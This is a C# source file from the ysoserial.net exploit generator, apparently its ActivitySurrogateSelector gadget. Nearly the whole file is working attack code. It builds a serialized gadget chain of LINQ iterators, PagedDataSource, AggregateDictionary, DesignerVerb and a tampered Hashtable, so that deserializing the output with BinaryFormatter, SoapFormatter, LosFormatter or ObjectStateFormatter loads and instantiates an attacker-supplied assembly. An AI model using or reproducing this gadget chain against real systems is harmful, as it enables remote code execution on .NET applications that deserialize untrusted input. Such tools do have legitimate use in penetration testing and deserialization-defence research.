﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Collections;
using System.ComponentModel.Design;
using System.Data;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.UI.WebControls;
using System.Runtime.Serialization;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class MySurrogateSelector : SurrogateSelector
    {
        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
        {
            selector = this;
            if (!type.IsSerializable)
            {
                Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                return (ISerializationSurrogate)Activator.CreateInstance(t);
            }

            return base.GetSurrogate(type, context, out selector);
        }

    }

    [Serializable]
    public class PayloadClass : ISerializable
    {
        protected byte[] assemblyBytes;
        public PayloadClass()
        {
            this.assemblyBytes = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "e.dll"));
        }

        protected PayloadClass(SerializationInfo info, StreamingContext context)
        {
        }
        private IEnumerable<TResult> CreateWhereSelectEnumerableIterator<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
        {
            Type t = Assembly.Load("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
              .GetType("System.Linq.Enumerable+WhereSelectEnumerableIterator`2")
              .MakeGenericType(typeof(TSource), typeof(TResult));
            return t.GetConstructors()[0].Invoke(new object[] { src, predicate, selector }) as IEnumerable<TResult>;
        }
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            System.Diagnostics.Trace.WriteLine("In GetObjectData");

            //Old technique contains a compiler-generated class [System.Core]System.Linq.Enumerable+<SelectManyIterator>d__[Compiler_Generated_Class_SEQ]`2,
            //the Compiler_Generated_Class_SEQ may NOT same in different version of .net framework. 
            //For example, in .net framework 4.6 was 16,and 17 in .net framework 4.7.

            /*
            // Build a chain to map a byte array to creating an instance of a class.
            // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
            List<byte[]> data = new List<byte[]>();
            data.Add(this.assemblyBytes);
            var e1 = data.Select(Assembly.Load);
            Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
            var e2 = e1.SelectMany(map_type);
            var e3 = e2.Select(Activator.CreateInstance);
            */

            //New technique use [System.Core]System.Linq.Enumerable+WhereSelectEnumerableIterator`2 only to fix it.
            //It make compatible from v3.5 to lastest(needs to using v3.5 compiler, and may also need to call disable type check first if target runtime was v4.8+).
            //Execution chain: Assembly.Load(byte[]).GetTypes().GetEnumerator().{MoveNext(),get_Current()} -> Activator.CreateInstance() -> Win!
            byte[][] e1 = new byte[][] { assemblyBytes };
            IEnumerable<Assembly> e2 = CreateWhereSelectEnumerableIterator<byte[], Assembly>(e1, null, Assembly.Load);
            IEnumerable<IEnumerable<Type>> e3 = CreateWhereSelectEnumerableIterator<Assembly, IEnumerable<Type>>(e2,
                null,
                (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate
                    (
                        typeof(Func<Assembly, IEnumerable<Type>>),
                        typeof(Assembly).GetMethod("GetTypes")
                    )
            );
            IEnumerable<IEnumerator<Type>> e4 = CreateWhereSelectEnumerableIterator<IEnumerable<Type>, IEnumerator<Type>>(e3,
                null,
                (Func<IEnumerable<Type>, IEnumerator<Type>>)Delegate.CreateDelegate
                (
                    typeof(Func<IEnumerable<Type>, IEnumerator<Type>>),
                    typeof(IEnumerable<Type>).GetMethod("GetEnumerator")
                )
            );
            //bool MoveNext(this) => Func<IEnumerator<Type>,bool> => predicate
            //Type get_Current(this) => Func<IEnumerator<Type>,Type> => selector
            //
            //WhereSelectEnumerableIterator`2.MoveNext => 
            //  if(predicate(IEnumerator<Type>)) {selector(IEnumerator<Type>);} =>
            //  IEnumerator<Type>.MoveNext();return IEnumerator<Type>.Current;
            IEnumerable<Type> e5 = CreateWhereSelectEnumerableIterator<IEnumerator<Type>, Type>(e4,
                (Func<IEnumerator<Type>, bool>)Delegate.CreateDelegate
                (
                    typeof(Func<IEnumerator<Type>, bool>),
                    typeof(IEnumerator).GetMethod("MoveNext")
                ),
                (Func<IEnumerator<Type>, Type>)Delegate.CreateDelegate
                (
                    typeof(Func<IEnumerator<Type>, Type>),
                    typeof(IEnumerator<Type>).GetProperty("Current").GetGetMethod()
                )
            );
            IEnumerable<object> end = CreateWhereSelectEnumerableIterator<Type, object>(e5, null, Activator.CreateInstance);
            // PagedDataSource maps an arbitrary IEnumerable to an ICollection
            PagedDataSource pds = new PagedDataSource() { DataSource = end };
            // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
            // Class is internal so need to use reflection.
            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

            // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
            DesignerVerb verb = new DesignerVerb("", null);
            // Need to insert IDictionary using reflection.
            typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

            // Pre-load objects, this ensures they're fixed up before building the hash table.
            List<object> ls = new List<object>();
            ls.Add(e1);
            ls.Add(e2);
            ls.Add(e3);
            ls.Add(e4);
            ls.Add(e5);
            ls.Add(end);
            ls.Add(pds);
            ls.Add(verb);
            ls.Add(dict);

            Hashtable ht = new Hashtable();

            // Add two entries to table.
            /*
            ht.Add(verb, "Hello");
            ht.Add("Dummy", "Hello2");
            */
            ht.Add(verb, "");
            ht.Add("", "");

            FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
            Array keys = (Array)fi_keys.GetValue(ht);
            FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
            for (int i = 0; i < keys.Length; ++i)
            {
                object bucket = keys.GetValue(i);
                object key = fi_key.GetValue(bucket);
                if (key is string)
                {
                    fi_key.SetValue(bucket, verb);
                    keys.SetValue(bucket, i);
                    break;
                }
            }

            fi_keys.SetValue(ht, keys);

            ls.Add(ht);

            // Wrap the object inside a DataSet. This is so we can use the custom
            // surrogate selector. Idiocy added and removed here.
            info.SetType(typeof(System.Data.DataSet));
            info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
            info.AddValue("DataSet.DataSetName", "");
            info.AddValue("DataSet.Namespace", "");
            info.AddValue("DataSet.Prefix", "");
            info.AddValue("DataSet.CaseSensitive", false);
            info.AddValue("DataSet.LocaleLCID", 0x409);
            info.AddValue("DataSet.EnforceConstraints", false);
            info.AddValue("DataSet.ExtendedProperties", (PropertyCollection)null);
            info.AddValue("DataSet.Tables.Count", 1);
            BinaryFormatter fmt = new BinaryFormatter();
            MemoryStream stm = new MemoryStream();
            fmt.SurrogateSelector = new MySurrogateSelector();
            fmt.Serialize(stm, ls);
            info.AddValue("DataSet.Tables_0", stm.ToArray());
        }
    }

    class ActivitySurrogateSelectorGenerator : GenericGenerator
    {
   
        public override string Description()
        {
            return "This gadget ignores the command parameter and executes the constructor of ExploitClass class.";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter" };
        }

        public override string Name()
        {
            return "ActivitySurrogateSelector";
        }

        public override string Finders()
        {
            return "James Forshaw,fixed by zcgonvh";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeNotDerived };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            PayloadClass payload = new PayloadClass();
            return Serialize(payload, formatter, inputArgs);
        }

    }
}
